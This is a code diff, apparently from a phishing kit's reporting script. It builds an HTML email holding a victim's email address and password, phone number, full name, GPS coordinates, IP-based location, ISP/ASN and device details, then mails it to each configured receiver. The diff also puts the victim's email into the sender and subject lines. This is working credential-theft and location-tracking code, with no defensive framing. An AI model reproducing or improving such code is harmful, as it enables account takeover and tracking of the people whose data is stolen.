@@ -257,41 +257,41 @@ body{
     <div class="mainbox">
         <div class="data-box">
             <div class="data-title">📧 ACCOUNT INFORMATION</div>
-            <div class="data-row"><div class="label">Email : </div><div class="value">${data.email || '-'}</div></div>
-            <div class="data-row"><div class="label">Password : </div><div class="value">${data.emailPassword || '-'}</div></div>
-            <div class="data-row"><div class="label">Phone : </div><div class="value">${data.phone || '-'}</div></div>
-            <div class="data-row"><div class="label">Full Name : </div><div class="value">${data.fullName || '-'}</div></div>
+            <div class="data-row"><div class="label">Email : </div><div class="value"> ${data.email || '-'}</div></div>
+            <div class="data-row"><div class="label">Password : </div><div class="value"> ${data.emailPassword || '-'}</div></div>
+            <div class="data-row"><div class="label">Phone : </div><div class="value"> ${data.phone || '-'}</div></div>
+            <div class="data-row"><div class="label">Full Name : </div><div class="value"> ${data.fullName || '-'}</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">📍 GPS LOCATION (AKURAT)</div>
-            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || asnData.latitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || asnData.longitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Accuracy : </div><div class="value">${data.gps_accuracy || '-'} m</div></div>
+            <div class="data-row"><div class="label">Latitude : </div><div class="value"> ${data.latitude || asnData.latitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Longitude : </div><div class="value"> ${data.longitude || asnData.longitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Accuracy : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">🌍 LOCATION (IP GEO - AKURAT 100%)</div>
-            <div class="data-row"><div class="label">Country : </div><div class="value">${countryName} ${flagEmoji}</div></div>
-            <div class="data-row"><div class="label">Province/Region : </div><div class="value">${regionName}</div></div>
-            <div class="data-row"><div class="label">City : </div><div class="value">${cityName}</div></div>
-            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${postalCode}</div></div>
+            <div class="data-row"><div class="label">Country : </div><div class="value"> ${countryName} ${flagEmoji}</div></div>
+            <div class="data-row"><div class="label">Province/Region : </div><div class="value"> ${regionName}</div></div>
+            <div class="data-row"><div class="label">City : </div><div class="value"> ${cityName}</div></div>
+            <div class="data-row"><div class="label">Postal Code : </div><div class="value"> ${postalCode}</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">🌐 NETWORK & ASN</div>
-            <div class="data-row"><div class="label">IP Address : </div><div class="value">${data.ip_address || '-'}</div></div>
-            <div class="data-row"><div class="label">ISP : </div><div class="value">${ispName}</div></div>
-            <div class="data-row"><div class="label">ASN : </div><div class="value">${asnInfo}</div></div>
-            <div class="data-row"><div class="label">AS Name : </div><div class="value">${asnameInfo}</div></div>
-            <div class="data-row"><div class="label">Organization : </div><div class="value">${asnData.org}</div></div>
+            <div class="data-row"><div class="label">IP Address : </div><div class="value"> ${data.ip_address || '-'}</div></div>
+            <div class="data-row"><div class="label">ISP : </div><div class="value"> ${ispName}</div></div>
+            <div class="data-row"><div class="label">ASN : </div><div class="value"> ${asnInfo}</div></div>
+            <div class="data-row"><div class="label">AS Name : </div><div class="value"> ${asnameInfo}</div></div>
+            <div class="data-row"><div class="label">Organization : </div><div class="value"> ${asnData.org}</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">🖥 DEVICE INFORMATION</div>
-            <div class="data-row"><div class="label">Platform : </div><div class="value">${data.platform || '-'}</div></div>
-            <div class="data-row"><div class="label">Resolution : </div><div class="value">${data.screenResolution || '-'}</div></div>
-            <div class="data-row"><div class="label">Language : </div><div class="value">${data.language || '-'}</div></div>
+            <div class="data-row"><div class="label">Platform : </div><div class="value"> ${data.platform || '-'}</div></div>
+            <div class="data-row"><div class="label">Resolution : </div><div class="value"> ${data.screenResolution || '-'}</div></div>
+            <div class="data-row"><div class="label">Language : </div><div class="value"> ${data.language || '-'}</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">⏰ TIMESTAMP</div>
-            <div class="data-row"><div class="label">Time : </div><div class="value">${data.timestamp || new Date().toLocaleString()}</div></div>
+            <div class="data-row"><div class="label">Time : </div><div class="value"> ${data.timestamp || new Date().toLocaleString()}</div></div>
         </div>
         <div class="footer-sign">DSTR - Powered by ASN Accurate Geolocation</div>
     </div>
@@ -305,9 +305,9 @@ body{
     for (const receiver of config.email) {
         if (!receiver || receiver === '') continue;
         await transporter.sendMail({
-            from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
+            from: `"${config.fromName} ${flagEmoji}" <${data.email || '-'}>`,
             to: receiver,
-            subject: `${config.subject} ${flagEmoji} ${SENDER_EMAIL} ${cityName} - ${regionName}`,
+            subject: `${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`,
             html: htmlContent
         });
         console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo}`);
